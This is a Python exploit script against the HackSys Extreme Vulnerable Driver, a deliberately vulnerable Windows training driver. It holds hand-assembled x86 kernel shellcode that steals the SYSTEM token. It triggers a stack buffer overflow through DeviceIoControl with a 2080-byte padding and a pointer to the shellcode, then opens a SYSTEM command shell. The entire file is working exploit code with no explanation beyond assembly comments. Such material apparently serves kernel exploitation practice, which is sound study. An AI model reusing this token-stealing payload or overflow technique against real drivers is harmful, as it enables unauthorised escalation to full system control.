from helper import *
from ctypes import *
import ctypes, os

def ioctl(function, devicetype = 0x00000022, access = 0x00000000, method = 0x00000003):
	return ((devicetype << 16) | (access << 14) | (function << 2) | method)

def main():
	HEVD_IOCTL_BUFFER_OVERFLOW_STACK = ioctl(0x800)
	lpFileName = "\\\\.\\HackSysExtremeVulnerableDriver"
	handle = get_handle(lpFileName)

	steal_token = (
		"\x90\x90\x90\x90"              # NOP Sled
		"\x60"                          # pusha
		"\x64\xa1\x24\x01\x00\x00"      # mov    eax,fs:0x124
		"\x8b\x40\x50"                  # mov    eax,DWORD PTR [eax+0x50]
		"\x89\xc1"                      # mov    ecx,eax
		"\xba\x04\x00\x00\x00"          # mov    edx,0x4
		"\x8b\x80\xb8\x00\x00\x00"      # mov    eax,DWORD PTR [eax+0xb8]
		"\x2d\xb8\x00\x00\x00"          # sub    eax,0xb8
		"\x39\x90\xb4\x00\x00\x00"      # cmp    DWORD PTR [eax+0xb4],edx
		"\x75\xed"                      # jne    11 <.text+0x11>
		"\x8b\x90\xf8\x00\x00\x00"      # mov    edx,DWORD PTR [eax+0xf8]
		"\x8b\xb9\xf8\x00\x00\x00"      # mov    edi,DWORD PTR [ecx+0xf8]
		"\x83\xe2\xf8"                  # and    edx,0xfffffff8
		"\x83\xe7\x07"                  # and    edi,0x7
		"\x01\xfa"                      # add    edx,edi
		"\x89\x91\xf8\x00\x00\x00"      # mov    DWORD PTR [ecx+0xf8],edx
		"\x61"                          # popa
		"\x31\xc0"                      # xor    eax,eax
		"\x5d"                          # pop    ebp
		"\xc2\x08\x00"                  # ret    0x8
	)

	# Allocate memory via VirtualAlloc()
	ptr = alloc_memory_virtualalloc(0, len(steal_token), steal_token)
	shellcode = p32(ptr)

	payload = "A" * 2080
	payload += shellcode
	inbuffer = create_string_buffer(payload)

	# Trigger the bug via DeviceIoControl()
	device = trigger(handle, HEVD_IOCTL_BUFFER_OVERFLOW_STACK, addressof(inbuffer), len(inbuffer))

	print("[+] Spawn SYSTEM shell\n")
	os.system("cmd.exe")

if __name__ == "__main__":
	main()
